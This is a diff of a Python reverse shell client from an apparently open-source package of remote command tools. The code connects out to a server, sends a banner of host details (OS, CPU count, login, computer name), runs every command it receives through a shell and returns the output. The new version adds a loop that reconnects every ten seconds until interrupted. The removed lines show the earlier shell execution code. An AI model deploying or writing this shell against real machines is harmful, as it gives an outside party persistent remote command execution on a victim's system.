@@ -1,9 +1,9 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 ###################
 #    This package implement 4 asynchronous tools to execute remote commands
-#    Copyright (C) 2020  Maurice Lambert
+#    Copyright (C) 2020, 2021  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -20,26 +20,28 @@
 ###################
 
 """
-    This module implement the class named ReverseShellClient.
+    This file implement a asynchronous ReverseShellClient.
 """
 
-import asyncore
-import os
+__all__ = ["ReverseShellClient"]
+
 from os import (
     getcwd,
-    chdir,
     getlogin,
     cpu_count,
     get_exec_path,
     getenv,
-    device_encoding,
 )
-from asyncio import create_subprocess_shell, run, gather
-from asyncio.subprocess import PIPE
-from time import perf_counter
+from asyncio import run
+from time import sleep
+import asyncore
+import os
 import logging
 
-__all__ = ["ReverseShellClient"]
+try:
+    from .commons import parse_args, launch_asynchronous_commands
+except ImportError:
+    from commons import parse_args, launch_asynchronous_commands
 
 
 class ReverseShellClient(asyncore.dispatcher):
@@ -48,140 +50,84 @@ class ReverseShellClient(asyncore.dispatcher):
     This class implement an Asynchrone Reverse Shell Client.
     """
 
-    def __init__(self, host, port):
+    def __init__(self, host: str, port: int):
         asyncore.dispatcher.__init__(self)
         self.create_socket()
         self.connect((host, port))
         self.get_first_buffer()
 
-    def get_first_buffer(self):
+    def get_first_buffer(self) -> None:
 
         """
-        This method add some informations to init the connection.
+        This method add some banner informations.
         """
-        
+
         path_exec = "\n\t".join(get_exec_path())
         self.buffer = (
             f"OS utilisé : {os.name}\nNombre de CPU : {cpu_count()}\n"
             f"Chemin d'exécution : \n\t{path_exec}"
         )
 
-    def get_buffer_end(self):
+    def get_buffer_end(self) -> None:
 
         """
-        This method add the last line of the output to the client.
+        This method add the prompt line.
         """
-        
+
         if os.name == "nt":
             self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}-{getcwd()}>"
         else:
             self.buffer += f"\n{getlogin()}@{getenv('COMPUTERNAME')}:{getcwd()}$"
 
-    def handle_close(self):
+    def handle_close(self) -> None:
         self.close()
 
-    def handle_read(self):
+    def handle_read(self) -> None:
 
         """
         Get the command and execute it or close connection.
         """
-        
-        commandes = self.recv(65535).decode()
-        results = run(launch_exec(commandes))
-        self.buffer = "\n".join(results)
 
-        if "exit" in results:
+        commandes = self.recv(65535).decode()
+        logging.info(f"Get commands: {commandes}")
+        self.buffer = "\n".join(run(launch_asynchronous_commands(commandes)))
+
+        if "\nexit\n" in self.buffer or self.buffer.startswith("exit"):
+            logging.warning("Send exit message.")
+            self.send(self.buffer.encode())
             self.close()
 
-    def writable(self):
+    def writable(self) -> bool:
         return len(self.buffer) > 0
 
-    def handle_write(self):
-    
+    def handle_write(self) -> None:
+
         """
-        This method send the command to the client.
+        This method responds to the server (send command output).
         """
-    
+
         self.get_buffer_end()
         sent = self.send(self.buffer.encode())
         self.buffer = self.buffer[sent:]
 
 
-async def special_command(commande):
+def main() -> None:
 
     """
-    This method execute commands with "special" execution.
-    The command "cd" and "exit" are implemented here.
+    This function get arguments and launch ReverseShellClient.
     """
-    
-    if commande.startswith("cd") or commande.startswith("chdir"):
+
+    logging.basicConfig(format="%(asctime)s %(levelname)s : %(message)s")
+
+    host, port = parse_args("ShellServer")
+
+    while True:
         try:
-            chdir(commande.split(maxsplit=1)[1])
-        except FileNotFoundError:
-            return "Error with command : <cd>"
-    elif commande.lower().startswith("exit"):
-        return "exit"
-
-
-async def exec_(commande):
-
-    """
-    This method execute commands and return output.
-    """
-    
-    result = await special_command(commande)
-    if result:
-        return result
-
-    debut = perf_counter()
-    process = await create_subprocess_shell(commande, stdout=PIPE, stderr=PIPE)
-    stdout, stderr = await process.communicate()
-
-    result = f"Temps : {perf_counter() - debut}s\nReturn code : {process.returncode}\n"
-    if stdout:
-        result += f"[stdout]\n{stdout.decode(device_encoding(0))}\n"
-    if stderr:
-        result += f"[stderr]\n{stderr.decode(device_encoding(0))}\n"
-    return result
-
-
-async def launch_exec(commandes):
-    
-    """
-    This method parse commands and launch asynchrone execution.
-    Return a list of commands output.
-    """
-    
-    return await gather(*(exec_(commande) for commande in commandes.split("&")))
-
-
-def main():
-    from sys import argv
-
-    port = 45678
-    host = "127.0.0.1"
-    argv_number = 0
-
-    for arg in argv:
-        if arg.startswith("--interface=") or arg.startswith("-i="):
-            host = arg.split("=")[1]
-            argv_number += 1
-        elif arg.startswith("--port=") or arg.startswith("-p="):
-            port = arg.split("=", 1)[1]
-            if port.isdigit():
-                port = int(port)
-                argv_number += 1
-            else:
-                logging.error("port must be an integer.")
-
-    if len(argv) - argv_number > 1:
-        print(
-            "USAGE : ReverseShellClient --interface=<interface name or adress"
-            ", default : ''> --port=<port number, default : 45678>"
-        )
-
-    ReverseShellClient(host, port)
-    asyncore.loop()
+            ReverseShellClient(host, port)
+            asyncore.loop()
+            sleep(10)
+        except KeyboardInterrupt:
+            break
 
 
 if __name__ == "__main__":
